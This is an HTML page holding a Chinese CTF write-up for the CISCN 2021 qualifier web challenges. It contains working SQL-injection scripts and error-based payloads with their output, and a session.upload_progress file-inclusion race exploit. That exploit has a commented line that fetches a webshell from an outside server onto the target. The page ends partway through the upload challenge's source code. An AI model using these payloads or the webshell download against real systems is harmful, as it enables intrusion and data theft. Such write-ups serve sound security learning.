@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='CISCN 2021 线上初赛'><title>CISCN 2021 Quals Writeup web</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-web/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='CISCN 2021 Quals Writeup web'>
+<meta property='og:description' content='CISCN 2021 线上初赛'>
+<meta property='og:url' content='https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-web/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='文件包含' /><meta property='article:tag' content='无列名注入' /><meta property='article:tag' content='ReflectionMethod' /><meta property='article:tag' content='imagecreatefrom' /><meta property='article:tag' content='session.upload_progress' /><meta property='article:published_time' content='2021-05-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-05-16T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg' />
+<meta name="twitter:title" content="CISCN 2021 Quals Writeup web">
+<meta name="twitter:description" content="CISCN 2021 线上初赛"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg' />
+    <link rel="shortcut icon" href="img/favicon.ico" />
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全与代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://anthem-whisper.github.io/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ciscn-2021-quals-writeup-web/">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg" loading="lazy" alt="Featured image of post CISCN 2021 Quals Writeup web" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >
+                文件包含
+            </a>
+        
+            <a href="/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" >
+                无列名注入
+            </a>
+        
+            <a href="/tags/reflectionmethod/" >
+                ReflectionMethod
+            </a>
+        
+            <a href="/tags/imagecreatefrom/" >
+                imagecreatefrom
+            </a>
+        
+            <a href="/tags/session.upload_progress/" >
+                session.upload_progress
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/ciscn-2021-quals-writeup-web/">CISCN 2021 Quals Writeup web</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        CISCN 2021 线上初赛
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">May 16, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p>就发下web的，所有wp戳这里-&gt;<a class="link" href="https://ctf.njupt.edu.cn/613.html"  target="_blank" rel="noopener"
+    >第十四届全国大学生信息安全竞赛初赛 Writeup by X1cT34m</a></p>
+<h2 id="web">Web</h2>
+<h3 id="easy_source">easy_source</h3>
+<p>原题，<code>ReflectionMethod</code> 构造 <code>User</code> 类中的函数方法，再通过 <code>getDocComment</code> 获取函数的注释</p>
+<p><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>
+<p>提交参数：</p>
+<pre><code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment
+</code></pre><p>爆破rb的值a-z，在q得到flag：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220457.png" alt=""  /></p>
+<p>CISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}</p>
+<h3 id="easy_sql">easy_sql</h3>
+<p>fuzz：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220503.png" alt="image-bansdasdsads"  /></p>
+<p>sqlmap得到表名flag和一个列名id：报错加无列名注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220520.png" alt=""  /></p>
+<p>一开始用按位比较：</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.35.238:23511/&#39;</span>
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">res</span> <span class="o">+=</span> <span class="n">flag</span>
+    <span class="k">return</span> <span class="n">res</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">200</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+        <span class="n">hexchar</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1&#39;) or (select 1,&#39;NO&#39;,&#39;CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-&#39;)&gt;=(select * from security.flag limit 1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexchar</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s1">&#39;passwd&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="n">text</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+        <span class="k">if</span> <span class="s1">&#39;login&lt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div><p>到最后卡住了，换了无列名注入报错爆列名，然后直接报错注入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210517175941.png" alt="image-20210517175932809"  /></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220543.png" alt=""  /></p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
+</span><span class="s1">//Duplicate column name &#39;</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="s1">&#39;
+</span><span class="s1">
+</span><span class="s1">admin&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="o">`</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="o">`</span> <span class="k">from</span> <span class="k">security</span><span class="p">.</span><span class="n">flag</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)))</span><span class="o">#</span>
+<span class="o">//</span><span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d&#39;</span>
+
+<span class="k">admin</span><span class="s1">&#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
+</span><span class="s1">//XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">uFWI</span><span class="o">-</span><span class="err">}</span><span class="o">~</span><span class="s1">&#39;
+</span></code></pre></div><p>CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}</p>
+<h3 id="middle_source">middle_source</h3>
+<p>首页给了任意文件包含</p>
+<p>扫目录得到<code>.listing</code>，得到<code>you_can_seeeeeeee_me.php</code>是phpinfo页面</p>
+<p>有了phpinfo可以尝试直接向phpinfo页面传文件加垃圾数据，同时从phpinfo获取临时文件名进行文件包含，或者利用<code>session.upload_progress</code>进行session文件包含</p>
+<p>前者尝试无效果</p>
+<p>从phpinfo得到了session保存路径：<code>/var/lib/php/sessions/fccecfeaje/</code></p>
+<p>尝试发现可以出网，虽然ban了很多函数，但是可以直接用copy或file_get_contents下载shell</p>
+<p>在<code>/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g</code>发现flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220552.png" alt=""  /></p>
+<p>exp：</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+
+<span class="c1">#file_content = &#39;&lt;?php print_r(scandir(&#34;/etc&#34;));?&gt;&#39;</span>
+<span class="c1">#file_content = &#39;&lt;?php copy(&#34;http://myvps/s.txt&#34;,&#34;/tmp/leon.php&#34;);echo &#34;666666666&#34;;?&gt;&#39;</span>
+<span class="c1">#s.txt是shell一句话</span>
+<span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php var_dump(file_get_contents(&#34;/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g&#34;));?&gt;&#39;</span>
+
+<span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://124.70.35.238:23579/&#39;</span>
+<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">POST</span><span class="p">():</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="nb">file</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&#34;upload&#34;</span><span class="p">:(</span><span class="s1">&#39;&lt;?php echo 999;?&gt;&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span><span class="p">:</span><span class="n">file_content</span>
+        <span class="p">}</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span><span class="s1">&#39;PHPSESSID=1234&#39;</span>
+        <span class="p">}</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="nb">file</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">READ</span><span class="p">():</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">event</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+        <span class="n">t</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://124.70.35.238:23579/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;cf&#34;</span><span class="p">:</span><span class="s1">&#39;../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234&#39;</span><span class="p">})</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2230</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+]retry&#39;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+<span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220603.png" alt=""  /></p>
+<p>CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}</p>
+<h3 id="upload">upload</h3>
+<p>mb_strtolower、PHP二次渲染</p>
+<p>这道题收卷两小时之前就看到phpinfo了，但是没做出来，有点可惜</p>
+<p>访问题目就有源码</p>
+<p>index.php</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
+    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这么大个的东西你是想d我吗？&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;如果不能好好传图片的话就还是不要来打扰我了&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;东西不能方方正正的话就很讨厌&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有些东西让你传上去的话那可不得了&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;传都没有传上去&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>扫目录能扫到example.php</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
+    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
+    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;要不咱们再看看？&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;都不能解压呢&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">echo</span> <span class="s2">&#34;可以解压，我想想存哪里&#34;</span><span class="p">;</span>
+    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
+    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
+    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
+    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
